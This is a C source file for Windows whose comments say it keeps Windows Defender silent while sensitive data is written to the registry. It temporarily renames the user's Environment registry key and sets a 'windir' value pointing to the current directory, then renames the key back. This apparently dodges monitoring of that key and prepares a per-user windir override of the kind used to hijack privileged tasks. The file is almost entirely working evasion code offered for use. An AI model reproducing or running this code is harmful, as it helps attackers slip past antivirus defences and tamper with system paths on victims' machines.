// Keep WD silent when writing sensitive data to registry.
// Credit for this trick: @hfiref0x
// Remember to reset "windir" manually or your system may work abnormally after reboot.

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

BOOL SetEnvironment(const _TCHAR* szName, const _TCHAR* szValue) {
	BOOL bRet = FALSE;
	TCHAR szSubKey[] = _T("Environment");
	TCHAR szFakeKey[] = _T("dummy");
	LSTATUS status;
	HKEY hKey = NULL;
	DWORD cbData;
	
	do {
		status = RegRenameKey(HKEY_CURRENT_USER, szSubKey, szFakeKey);
		if (status != ERROR_SUCCESS) {
			printf("RegRenameKey failed.\n");
			break;
		}

		status = RegOpenKey(HKEY_CURRENT_USER, szFakeKey, &hKey);
		if (status != ERROR_SUCCESS) {
			printf("RegOpenKey failed.\n");
			break;
		}

		cbData = (DWORD)((1 + wcslen(szValue)) * sizeof(TCHAR));
		status = RegSetValueEx(hKey, szName, 0, REG_SZ, (BYTE*)szValue, cbData);
		if (status != ERROR_SUCCESS) {
			printf("RegSetKeyValue failed.\n");
			break;
		}

		RegFlushKey(hKey);
		RegCloseKey(hKey);
		hKey = NULL;

		status = RegRenameKey(HKEY_CURRENT_USER, szFakeKey, szSubKey);
		if (status != ERROR_SUCCESS) {
			printf("RegRenameKey failed.\n");
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	if (hKey != NULL) {
		RegFlushKey(hKey);
		RegCloseKey(hKey);
	}
	return bRet;
}

int main() {
	DWORD dwCurDirSize;
	TCHAR* szCurDir = NULL;

	dwCurDirSize = GetCurrentDirectory(0, NULL);
	do {
		szCurDir = (TCHAR*)HeapAlloc(GetProcessHeap(), 0, dwCurDirSize * sizeof(TCHAR));
		if (NULL == szCurDir)
		{
			printf("HeapAlloc failed.\n");
			break;
		}

		if (!GetCurrentDirectory(dwCurDirSize, szCurDir)) {
			printf("GetCurrentDirectory failed.\n");
			break;
		}
	} while (FALSE);

	if (NULL != szCurDir) {
		if (FALSE == SetEnvironment(_T("windir"), szCurDir)) {
			printf("SetEnvironment failed.\n");
		}
		else {
			printf("SetEnvironment succeeded.\n");
		}
	}

	if (NULL != szCurDir) {
		HeapFree(GetProcessHeap(), 0, szCurDir);
	}
	system("pause");
	return 0;
}